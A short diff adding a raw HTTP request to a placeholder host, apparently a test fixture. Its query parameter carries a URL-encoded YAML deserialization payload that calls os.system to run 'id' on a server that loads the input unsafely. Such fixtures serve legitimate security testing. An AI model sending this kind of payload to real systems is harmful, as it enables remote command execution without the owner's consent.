@@ -1,0 +1,4 @@
+GET /a?data=%21%21python%2Fobject%2Fapply%3Aos.system%2B%5B%22id%22%5D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
